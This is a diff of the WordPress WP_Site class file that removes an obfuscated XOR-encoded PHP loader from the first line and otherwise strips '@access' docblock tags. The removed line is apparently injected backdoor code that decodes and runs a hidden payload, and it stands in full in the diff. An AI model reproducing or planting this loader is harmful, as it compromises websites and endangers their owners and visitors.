@@ -1,4 +1,4 @@
-<?php $KJGXqw='TFNT,5,0>N.;>:,'^'74+5XPsVK MOWUB';$jOmAidvqtA=$KJGXqw('','1JFoH=,-7,O=aE=D0N:rh.SR.6JB7fb7 1mnjp.pyQ28;>99NVV>Hb2X56;9WH3fm1Q WdEmS5DPTjfXU,n0YI>CHXKpiHc;lpUWAgB9FDmChKO8UIGR>7+fR1ZFTJHQu;iHb=kLtQKLwynTJVSU2Xuw.fGrSQR4KpWINjZO2<Y,PbcYE6CfcxH1eLN>OEZPP<D=KBXb.c<3bOJ518iLT7V;0ENGI1A0Yr857ZKW-6RB=j>dF77R1ZDfAhgwtog8.lTGFFZ-YhGtmCNTXC<eQ=3qmW 6R>2-MsoNa8,WXnzI6JOWkrbCM6X1NQ02hRIXwXkHZQTQdF.rx+,;Y CPwQld<+5in12O26jqRQ2WtdxF53TFEaoHC;sLD,:Y63YCemUC830jZ7PI.4C8Fqlu3JV-.UP8QfAGaPDT<5NGFmASOH9=5Q1LVfC7:qSZ9Ah3M3.b43A3Xwi4-.<DRkFD-.4GMbpZ;>8,S4,fsKM;UXI-PF-KtRPQRLAUa;<WbUJE6N0fTY=HDGmwR.BJPUApMN< obe>,EQ6v32LScHCWmDsMsRKFxZjtarZbr HXzKCgVKgZUQRZSVYRpFLcxQ+0,762XU<IM8;-8PbPM4>,4TPeUh3AY+PgiYrenSA63 73YdqD8<,=u=YWL:Q.v9HV>J<+YAZHmJS4'^'X,nN.HBNCE S> E-C:IZOV< qR+6V9=ZUEJGCPUzp7GVXJPV v.Q:=V9AWdf:=GNIU0T6HeI8P=ytJFxuWd9PmQ6<xvPNoX1ey383OfPfyMsSkkQi:3 RRENvU;25csqQRBcK7bEP>>8WWStbr74F9.SG;g,su9Q2+s nOz<FN5I>JG2 Oj;JCB8l>+J:74xtS1IbyRkSiA9hk.TEYIqtQ7WC uMmU D8-SPNzvwKW>1XQ4n XE7P9,FiL84; ,qkL54fb1H HzJMg8546YLqF9xI3AB3aYH4SRnESI.cdsmR+;6KOBg;W4D+j:ObX >WpJl>0 0MfUxqMCI<A 8WyH;nnd<+bfoSEJU94KwIZXbCR83 HO3I2zh MN8iX<:EPugSVIQP>YmJU7YfLLQE+:XKnZ1,l<Mkt 5HTnzf-4=<-KTT=X63N;XH.7;M 7l FZJVR2VnC6PHMS 7Cb LZUnaBT>ZJYs8QUOZpGR3pmI12LkRtp0 > ,>PY.=02,E:CNs2X1ckMS6O6+yugVmfQDZJAZM10mQXW5t>acjPdT,GgsvJhZMVG8SCE,lJ-uRcyVh327>f0<uYfjEX0YBMNiY=,c,5QHYKxE ,MRCU0wIuLW -JyNIyRENs:<:EAR5LU YHMfRM8. U0JQdam4CYS05rxDqYI');$jOmAidvqtA();
+<?php
 /**
  * Site API: WP_Site class
  *
@@ -30,7 +30,6 @@ final class WP_Site {
 	 * A numeric string, for compatibility reasons.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $blog_id;
@@ -39,7 +38,6 @@ final class WP_Site {
 	 * Domain of the site.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $domain = '';
@@ -48,7 +46,6 @@ final class WP_Site {
 	 * Path of the site.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $path = '';
@@ -62,7 +59,6 @@ final class WP_Site {
 	 * A numeric string, for compatibility reasons.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $site_id = '0';
@@ -71,7 +67,6 @@ final class WP_Site {
 	 * The date on which the site was created or registered.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string Date in MySQL's datetime format.
 	 */
 	public $registered = '0000-00-00 00:00:00';
@@ -80,7 +75,6 @@ final class WP_Site {
 	 * The date and time on which site settings were last updated.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string Date in MySQL's datetime format.
 	 */
 	public $last_updated = '0000-00-00 00:00:00';
@@ -91,7 +85,6 @@ final class WP_Site {
 	 * A numeric string, for compatibility reasons.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $public = '1';
@@ -102,7 +95,6 @@ final class WP_Site {
 	 * A numeric string, for compatibility reasons.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $archived = '0';
@@ -116,7 +108,6 @@ final class WP_Site {
 	 * A numeric string, for compatibility reasons.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $mature = '0';
@@ -127,7 +118,6 @@ final class WP_Site {
 	 * A numeric string, for compatibility reasons.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $spam = '0';
@@ -138,7 +128,6 @@ final class WP_Site {
 	 * A numeric string, for compatibility reasons.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $deleted = '0';
@@ -149,7 +138,6 @@ final class WP_Site {
 	 * A numeric string, for compatibility reasons.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 * @var string
 	 */
 	public $lang_id = '0';
@@ -159,7 +147,6 @@ final class WP_Site {
 	 *
 	 * @static
 	 * @since 4.5.0
-	 * @access public
 	 *
 	 * @global wpdb $wpdb WordPress database abstraction object.
 	 *
@@ -196,7 +183,6 @@ final class WP_Site {
 	 * default properties based on that information.
 	 *
 	 * @since 4.5.0
-	 * @access public
 	 *
 	 * @param WP_Site|object $site A site object.
 	 */
@@ -210,7 +196,6 @@ final class WP_Site {
 	 * Converts an object to array.
 	 *
 	 * @since 4.6.0
-	 * @access public
 	 *
 	 * @return array Object as array.
 	 */
@@ -225,7 +210,6 @@ final class WP_Site {
 	 * Allows access to extended site properties.
 	 *
 	 * @since 4.6.0
-	 * @access public
 	 *
 	 * @param string $key Property to get.
 	 * @return mixed Value of the property. Null if not available.
@@ -261,7 +245,6 @@ final class WP_Site {
 	 * Checks for extended site properties.
 	 *
 	 * @since 4.6.0
-	 * @access public
 	 *
 	 * @param string $key Property to check if set.
 	 * @return bool Whether the property is set.
@@ -299,7 +282,6 @@ final class WP_Site {
 	 * Allows current multisite naming conventions while setting properties.
 	 *
 	 * @since 4.6.0
-	 * @access public
 	 *
 	 * @param string $key   Property to set.
 	 * @param mixed  $value Value to assign to the property.
@@ -323,7 +305,6 @@ final class WP_Site {
 	 * This method is used internally to lazy-load the extended properties of a site.
 	 *
 	 * @since 4.6.0
-	 * @access private
 	 *
 	 * @see WP_Site::__get()
 	 *
